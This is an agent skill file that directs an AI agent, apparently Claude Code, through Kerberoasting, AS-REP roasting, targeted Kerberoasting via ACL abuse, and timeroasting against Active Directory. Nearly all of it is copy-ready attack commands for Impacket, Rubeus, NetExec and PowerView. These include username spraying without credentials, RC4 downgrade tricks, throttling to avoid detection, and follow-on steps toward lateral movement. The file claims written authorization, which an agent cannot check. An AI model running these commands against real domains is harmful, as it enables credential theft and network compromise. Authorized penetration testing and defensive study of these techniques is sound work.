---
name: kerberos-roasting
description: >
  Extracts and cracks Kerberos service tickets (Kerberoasting) and AS-REP
  hashes (AS-REP Roasting) for offline password recovery.
keywords:
  - kerberoast
  - kerberoasting
  - asreproast
  - AS-REP
  - GetUserSPNs
  - service ticket
  - SPN cracking
  - roasting
  - GetNPUsers
  - pre-authentication disabled
  - targeting AD service accounts with SPNs or accounts with pre-auth disabled
tools:
  - Impacket (GetUserSPNs.py
  - GetNPUsers.py)
  - Rubeus
  - netexec
  - targetedKerberoast.py
opsec: medium
---

# Kerberos Roasting

You are helping a penetration tester perform Kerberoasting (extracting TGS
tickets for offline cracking) and AS-REP Roasting (extracting AS-REP hashes
from accounts without pre-authentication). All testing is under explicit
written authorization.

## Engagement Logging

Check for `./engagement/` directory. If absent, proceed without logging.

When an engagement directory exists:
- Print `[kerberos-roasting] Activated → <target>` to the screen on activation.
- **Evidence** → save significant output to `engagement/evidence/` with
  descriptive filenames (e.g., `sqli-users-dump.txt`, `ssrf-aws-creds.json`).

## State Management

Call `get_state_summary()` from the state-reader MCP server to read current
engagement state. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Your return summary must include:
- New targets/hosts discovered (with ports and services)
- New credentials or tokens found
- Access gained or changed (user, privilege level, method)
- Vulnerabilities confirmed (with status and severity)
- Pivot paths identified (what leads where)
- Blocked items (what failed and why, whether retryable)

## Prerequisites

- Any valid domain user credential (for standard Kerberoasting/AS-REP roasting)
- OR: a username with DONT_REQ_PREAUTH (for Kerberoasting without a domain account)
- OR: just a username list (for AS-REP roasting without authentication)
- Tools: Impacket, optionally `netexec`, `Rubeus`, `bloodyAD`

**Kerberos-first authentication:**

```bash
# Get a TGT first
cd $TMPDIR && getTGT.py DOMAIN/user:'Password123' -dc-ip DC_IP
# or with NTLM hash
cd $TMPDIR && getTGT.py DOMAIN/user -hashes :NTHASH -dc-ip DC_IP

export KRB5CCNAME=$TMPDIR/user.ccache

# All Impacket roasting tools support -k -no-pass
GetUserSPNs.py DOMAIN/user@DC.DOMAIN.LOCAL -k -no-pass -dc-ip DC_IP -request
GetNPUsers.py DOMAIN/user@DC.DOMAIN.LOCAL -k -no-pass -dc-ip DC_IP
```

**Tool output directory**: `getTGT.py` writes `<user>.ccache` to CWD with no
`-out` flag. Always prefix with `cd $TMPDIR &&`. TGS/AS-REP hash output files
(via `-outputfile`) support explicit paths.

## Privileged Commands

Claude Code cannot execute `sudo` commands. The following require root and
must be handed off to the user:

- **timeroast.py** — NTP authentication hash extraction (needs raw sockets for UDP 123)
- **ntpdate / rdate** — clock synchronization (needed for Kerberos, requires root)

**Handoff protocol:** Present the full command including `sudo`, ask the user
to run it, then read the output file (`tee` captures timeroast output) or
confirm completion (ntpdate).

**Non-privileged commands** Claude can execute directly:
- All roasting tools: `GetUserSPNs.py`, `GetNPUsers.py`, `netexec`, `Rubeus`
- Targeted kerberoasting: `targetedKerberoast.py`, `bloodyAD`
- Cracking: delegate to **credential-cracking** skill

## Step 1: Assess

Determine what access level is available:

1. **Valid domain credentials** (password, hash, or TGT) -> proceed to Step 2
2. **Username with DONT_REQ_PREAUTH known** -> skip to Step 5 (AS-REP) or
   Step 6 (Kerberoasting without domain account)
3. **Username list only, no credentials** -> skip to Step 5 (AS-REP)
4. **Write access to user objects (GenericAll/GenericWrite)** -> Step 7 (Targeted)

## Step 2: Enumerate Kerberoastable Accounts

### Impacket (Linux)

```bash
# List all user accounts with SPNs (no ticket request yet)
GetUserSPNs.py DOMAIN/user:'Password123' -dc-ip DC_IP

# With Kerberos auth
GetUserSPNs.py DOMAIN/user@DC.DOMAIN.LOCAL -k -no-pass -dc-ip DC_IP
```

### NetExec

```bash
# Enumerate via LDAP and extract in one step
nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' \
  --kerberoasting kerberoast.txt

# With Kerberos auth
nxc ldap DC01.DOMAIN.LOCAL --use-kcache --kerberoasting kerberoast.txt
```

### Rubeus (Windows)

```powershell
# Statistics overview — encryption types, password age, admin status
.\Rubeus.exe kerberoast /stats

# List without requesting (enumeration only)
.\Rubeus.exe kerberoast /stats /nowrap
```

### Prioritize Targets

Before mass-roasting, prioritize by:
- **AdminCount=1** — service accounts in privileged groups
- **pwdLastSet age** — older passwords are weaker (years-old = likely crackable)
- **Encryption type** — RC4 (etype 23) cracks 1000x faster than AES (etype 17/18)
- **Blast radius** — BloodHound shortest path from SPN account to DA

## Step 3: Extract TGS Hashes (Kerberoasting)

### Impacket (Linux) — Preferred

```bash
# Request all SPN tickets
GetUserSPNs.py DOMAIN/user:'Password123' -dc-ip DC_IP \
  -request -outputfile hashes.kerberoast

# Target single user (reduces noise)
GetUserSPNs.py DOMAIN/user:'Password123' -dc-ip DC_IP \
  -request-user svc_mssql -outputfile hashes.kerberoast

# With NTLM hash
GetUserSPNs.py DOMAIN/user -dc-ip DC_IP \
  -hashes :NTHASH -request -outputfile hashes.kerberoast

# With Kerberos auth (most OPSEC-safe)
GetUserSPNs.py DOMAIN/user@DC.DOMAIN.LOCAL -k -no-pass \
  -request -outputfile hashes.kerberoast
```

### Rubeus (Windows)

```powershell
# All SPNs (noisy — avoid in mature environments)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

# Target single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast

# Admins only (smaller footprint)
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap

# RC4 downgrade via tgtdeleg trick (forces RC4 even on AES-enabled accounts)
.\Rubeus.exe kerberoast /tgtdeleg

# OPSEC-safer: only roast accounts that already lack AES support
.\Rubeus.exe kerberoast /rc4opsec

# Throttled extraction
.\Rubeus.exe kerberoast /user:svc_mssql /delay:2000 /jitter:30 /nowrap

# Scope to specific OU
.\Rubeus.exe kerberoast /ou:"OU=ServiceAccounts,DC=domain,DC=local" /nowrap

# Target old passwords (more likely weak)
.\Rubeus.exe kerberoast /pwdsetbefore:01-01-2022 /nowrap
```

### PowerView (Windows)

```powershell
# All user SPNs to hashcat format
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv kerberoast.csv -NoTypeInformation
```

## Step 4: Crack Offline

### Hash Formats

| Hash Prefix | Encryption | Hashcat Mode | John Format |
|-------------|-----------|--------------|-------------|
| `$krb5tgs$23$` | RC4 (etype 23) | `13100` | `krb5tgs` |
| `$krb5tgs$17$` | AES128 (etype 17) | `19600` | `krb5tgs` |
| `$krb5tgs$18$` | AES256 (etype 18) | `19700` | `krb5tgs` |

**Cracking speed: RC4 is ~1000x faster than AES.** Always prefer RC4 tickets.

**Do NOT crack hashes in this skill.** Save hashes to `engagement/evidence/`
and return to the orchestrator with the hash file path, hash type/mode (see
table above), and a routing recommendation to **credential-cracking**.

```bash
# Save extracted TGS hashes to evidence
cp hashes.kerberoast engagement/evidence/kerberoast-tgs-hashes.txt
```

### After Cracking (post credential-cracking)

With recovered service account credentials:
1. Check what the account has access to (BloodHound, nxc)
2. Test for local admin: `nxc smb TARGETS -u svc_user -p 'CrackedPass' -d DOMAIN`
3. Look for (Pwn3d!) — local admin on servers
4. Escalate for lateral movement or **credential-dumping** if admin

## Step 5: AS-REP Roasting

Targets accounts with `DONT_REQ_PREAUTH` flag. No valid credentials needed
to request the hash — only need to know the username.

### Enumerate AS-REP Roastable Accounts

```bash
# With credentials — auto-enumerate via LDAP
GetNPUsers.py DOMAIN/user:'Password123' -dc-ip DC_IP

# With Kerberos auth
GetNPUsers.py DOMAIN/user@DC.DOMAIN.LOCAL -k -no-pass -dc-ip DC_IP

# NetExec
nxc ldap DC01.DOMAIN.LOCAL -u 'user' -p 'Password123' \
  --asreproast asrep-hashes.txt

# bloodyAD — direct LDAP filter
bloodyAD -u user -p 'Password123' -d DOMAIN.LOCAL --host DC_IP \
  get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' \
  --attr sAMAccountName

# PowerView (Windows)
Get-DomainUser -PreauthNotRequired -Verbose
```

### Extract AS-REP Hashes

```bash
# Without credentials — spray a username list
GetNPUsers.py DOMAIN/ -usersfile users.txt -format hashcat \
  -outputfile asrep-hashes.txt -dc-ip DC_IP

# Single known user (no password needed)
GetNPUsers.py DOMAIN/targetuser -no-pass -dc-ip DC_IP

# Rubeus (Windows)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep-hashes.txt
.\Rubeus.exe asreproast /user:targetuser /format:hashcat /outfile:asrep-hashes.txt
```

### AS-REP Hash Format Reference

| Hash Prefix | Hashcat Mode | John Format |
|-------------|--------------|-------------|
| `$krb5asrep$23$` | `18200` | `krb5asrep` |

**Do NOT crack hashes in this skill.** Save AS-REP hashes to
`engagement/evidence/` and return to the orchestrator with the hash file path,
hash type (AS-REP / hashcat mode 18200), and a routing recommendation to
**credential-cracking**.

```bash
# Save extracted AS-REP hashes to evidence
cp asrep-hashes.txt engagement/evidence/asrep-hashes.txt
```

## Step 6: Kerberoasting Without a Domain Account

If you have a username with DONT_REQ_PREAUTH but no valid domain password,
you can request service tickets by altering the `sname` field in the AS-REQ.

```bash
# Impacket (PR #1413) — provide no-preauth user and target list
GetUserSPNs.py -no-preauth "NOPREAUTH_USER" -usersfile users.txt \
  -dc-host DC01.DOMAIN.LOCAL DOMAIN.LOCAL/

# NetExec
nxc ldap DC01.DOMAIN.LOCAL -u '' -p '' \
  --no-preauth-targets users.txt --kerberoasting output.txt

# Rubeus
.\Rubeus.exe kerberoast /nopreauth:NOPREAUTH_USER /spn:TARGET_SPN \
  /domain:DOMAIN.LOCAL /dc:DC01.DOMAIN.LOCAL /outfile:hashes.txt
```

**Limitation**: Cannot enumerate SPNs via LDAP without credentials. Must
provide a user list to test against.

## Step 7: Targeted Kerberoasting (ACL Abuse)

When you have GenericWrite or GenericAll on a user account, you can
temporarily set an SPN to make it Kerberoastable.

### Automated (Linux)

```bash
# targetedKerberoast.py — adds SPN, requests TGS (RC4), removes SPN
targetedKerberoast.py -d DOMAIN.LOCAL -u attacker -p 'Password123' \
  --request-user target_admin

# With Kerberos auth
targetedKerberoast.py -d DOMAIN.LOCAL -u attacker -k --no-pass \
  --request-user target_admin
```

### Manual (Windows)

```powershell
# 1. Add temporary SPN
Set-DomainObject -Identity target_admin -Set @{serviceprincipalname='fake/TempSvc'} -Verbose

# 2. Roast
.\Rubeus.exe kerberoast /user:target_admin /nowrap

# 3. Clean up immediately
Set-DomainObject -Identity target_admin -Clear serviceprincipalname -Verbose
```

### OPSEC Warning

- Adding/removing SPNs generates **Event IDs 5136 and 4738** (directory
  service object modified and user account changed)
- Keep the SPN window as short as possible
- Use `targetedKerberoast.py` which automates cleanup

## Step 8: Timeroasting

Exploits Windows NTP authentication to extract hashes for computer accounts.
**Completely unauthenticated** — only needs network access to DC on UDP 123.

```bash
# Request NTP hashes for all computer accounts
sudo timeroast.py DC_IP | tee ntp-hashes.txt

```

| Hash Type | Hashcat Mode |
|-----------|--------------|
| NTP (timeroast) | `31300` |

**Do NOT crack hashes in this skill.** Save NTP hashes to
`engagement/evidence/timeroast-hashes.txt` and return to the orchestrator with
the hash file path, hash type (NTP / hashcat mode 31300), and a routing
recommendation to **credential-cracking**.

**Practical value is limited**: Computer account passwords are typically 120+
random characters. Most useful against **trust accounts** between domains,
which may have weaker passwords.

## Step 9: Escalate or Pivot

STOP and return to the orchestrator with:
- What was achieved (RCE, creds, file read, etc.)
- New credentials, access, or pivot paths discovered
- Context for next steps (platform, access method, working payloads)

## Troubleshooting

### KRB_AP_ERR_SKEW (Clock Skew)

Kerberos requires clocks within 5 minutes of the DC. This is a **Clock Skew
Interrupt** — stop immediately and return to the orchestrator. Do not retry or
fall back to NTLM. The fix requires root:
```bash
sudo ntpdate DC_IP
# or
sudo rdate -n DC_IP
```

### No SPN Accounts Found

- Computer accounts have SPNs but are not useful for Kerberoasting (passwords
  are 120+ char random). Only **user** accounts with SPNs are targets.
- Check if SPNs are set on group managed service accounts (gMSA) — these also
  have strong passwords and are not crackable.

### RC4 Disabled Domain-Wide

If only AES tickets are available:
- Cracking is ~1000x slower but still feasible with good wordlists and rules
- Use hashcat modes `19600` (AES128) or `19700` (AES256)
- Consider the `/tgtdeleg` trick in Rubeus which may still force RC4

### Hash Format Issues

- Impacket outputs hashcat format by default
- Rubeus outputs hashcat format with `/format:hashcat`
- To convert `.kirbi` files: `kirbi2john.py ticket.kirbi > hash.john`
- Convert John to hashcat: `sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*\$\2/' hash.john`

### OPSEC Considerations

| Action | Detection | Event ID |
|--------|-----------|----------|
| TGS request (Kerberoast) | Kerberos service ticket requested | 4769 |
| AS-REP request | TGT requested with no pre-auth | 4768 (preauth type 0) |
| RC4 ticket request | Anomalous in AES-hardened domain | 4769 (etype 0x17) |
| SPN added/removed (targeted) | Directory object modified | 5136, 4738 |
| Mass TGS requests | High volume 4769 from single source | SIEM correlation |
